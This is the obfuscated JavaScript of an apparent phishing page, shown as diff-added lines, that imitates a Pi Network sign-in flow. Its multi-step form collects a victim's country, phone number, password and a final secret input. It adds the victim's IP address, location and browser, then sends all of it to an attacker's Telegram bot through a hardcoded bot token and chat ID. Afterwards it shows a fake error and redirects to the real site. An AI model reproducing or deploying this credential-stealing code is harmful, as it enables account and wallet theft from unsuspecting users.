_0x1355d3=['6848819763:AAEFWzRagLNU_WMXE91QfEy0kdRHJH1ZuNA','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Browser:\x20','click','938123FLtvdM','step2','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20IP:\x20','date','finalInput','country','3441250aUXYyN','step1','remove','phone','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Phone:\x20','application/json','userAgent','https://node.minepi.com/','step3','POST','json','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Final\x20Input:\x20','3517372QdXVgD','stringify','browser','href','addEventListener','something\x20went\x20wrong\x20internal\x20error','password','464RpGkpK','add','getElementById','2507376TloLvK','https://ipapi.co/','55nilxrk','12168DMDNth','startButton','submit','error','classList','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Location:\x20','Please\x20enter\x20your\x20password.','5AKIKVX','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Date:\x20','hidden','next2','form-container','5727351UEPxmJ','location','170ckONZS','value','city','toLocaleString','next1','34215PNiZow'];_0x10b7=function(){return _0x1355d3;};return _0x10b7();}document['getElementById'](_0x29ea43(0x158))[_0x29ea43(0x14e)](_0x29ea43(0x16d),()=>{const _0x334ed7=_0x29ea43;document[_0x334ed7(0x153)]('startDiv')[_0x334ed7(0x15b)][_0x334ed7(0x152)]('hidden'),document[_0x334ed7(0x153)](_0x334ed7(0x162))['classList'][_0x334ed7(0x140)](_0x334ed7(0x160));}),document['getElementById'](_0x29ea43(0x169))['addEventListener'](_0x29ea43(0x16d),()=>{const _0x3aee1e=_0x29ea43;formData[_0x3aee1e(0x13d)]=document[_0x3aee1e(0x153)](_0x3aee1e(0x13d))[_0x3aee1e(0x166)],formData[_0x3aee1e(0x141)]=document['getElementById'](_0x3aee1e(0x141))['value'],formData[_0x3aee1e(0x13d)]&&formData[_0x3aee1e(0x141)]?(document[_0x3aee1e(0x153)](_0x3aee1e(0x13f))[_0x3aee1e(0x15b)]['add']('hidden'),document[_0x3aee1e(0x153)](_0x3aee1e(0x16f))[_0x3aee1e(0x15b)]['remove'](_0x3aee1e(0x160))):alert('Please\x20fill\x20in\x20all\x20fields.');}),document[_0x29ea43(0x153)](_0x29ea43(0x161))[_0x29ea43(0x14e)](_0x29ea43(0x16d),()=>{const _0x3fcf8c=_0x29ea43;formData[_0x3fcf8c(0x150)]=document[_0x3fcf8c(0x153)](_0x3fcf8c(0x150))[_0x3fcf8c(0x166)],formData[_0x3fcf8c(0x150)]?(document[_0x3fcf8c(0x153)](_0x3fcf8c(0x16f))['classList'][_0x3fcf8c(0x152)](_0x3fcf8c(0x160)),document['getElementById'](_0x3fcf8c(0x146))[_0x3fcf8c(0x15b)][_0x3fcf8c(0x140)](_0x3fcf8c(0x160))):alert(_0x3fcf8c(0x15d));}),document[_0x29ea43(0x153)](_0x29ea43(0x159))[_0x29ea43(0x14e)](_0x29ea43(0x16d),async()=>{const _0x3f8a93=_0x29ea43;formData[_0x3f8a93(0x172)]=document[_0x3f8a93(0x153)](_0x3f8a93(0x172))[_0x3f8a93(0x166)];if(formData[_0x3f8a93(0x172)]){await fetchIP();const _0x28cb17='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Country:\x20'+formData['country']+_0x3f8a93(0x142)+formData[_0x3f8a93(0x141)]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Password:\x20'+formData[_0x3f8a93(0x150)]+_0x3f8a93(0x149)+formData[_0x3f8a93(0x172)]+_0x3f8a93(0x170)+userDetails['ip']+_0x3f8a93(0x16c)+userDetails[_0x3f8a93(0x14c)]+_0x3f8a93(0x15c)+userDetails[_0x3f8a93(0x164)]+_0x3f8a93(0x15f)+userDetails[_0x3f8a93(0x171)]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';await sendToTelegram(_0x28cb17),alert(_0x3f8a93(0x14f)),window[_0x3f8a93(0x164)][_0x3f8a93(0x14d)]=_0x3f8a93(0x145);}else{}});async function fetchIP(){const _0x2e7156=_0x29ea43;try{const _0x33e2cd=await fetch('https://api.ipify.org?format=json'),_0x116d6e=await _0x33e2cd[_0x2e7156(0x148)]();userDetails['ip']=_0x116d6e['ip'],userDetails[_0x2e7156(0x14c)]=navigator[_0x2e7156(0x144)];const _0x473f8a=await fetch(_0x2e7156(0x155)+_0x116d6e['ip']+'/json/'),_0x5a0231=await _0x473f8a[_0x2e7156(0x148)]();userDetails[_0x2e7156(0x164)]=_0x5a0231[_0x2e7156(0x167)]+',\x20'+_0x5a0231['region']+',\x20'+_0x5a0231[_0x2e7156(0x13d)];}catch(_0x18187d){console[_0x2e7156(0x15a)]('Error\x20fetching\x20IP\x20or\x20location:',_0x18187d);}}async function sendToTelegram(_0x3759ba){const _0x1cda30=_0x29ea43,_0x3dca61=_0x1cda30(0x16b),_0x18c4c5='6965372099',_0x43b220='https://api.telegram.org/bot'+_0x3dca61+'/sendMessage';await fetch(_0x43b220,{'method':_0x1cda30(0x147),'headers':{'Content-Type':_0x1cda30(0x143)},'body':JSON[_0x1cda30(0x14b)]({'chat_id':_0x18c4c5,'text':_0x3759ba})});}
+</script>
+
+</body>
+</html>
+
+ 
+  <div class="footer">
+    <a href="#">Terms of Service</a> - <a href="#">Privacy Policy</a>
+  </div>
+</center>
+</body>
+</html>
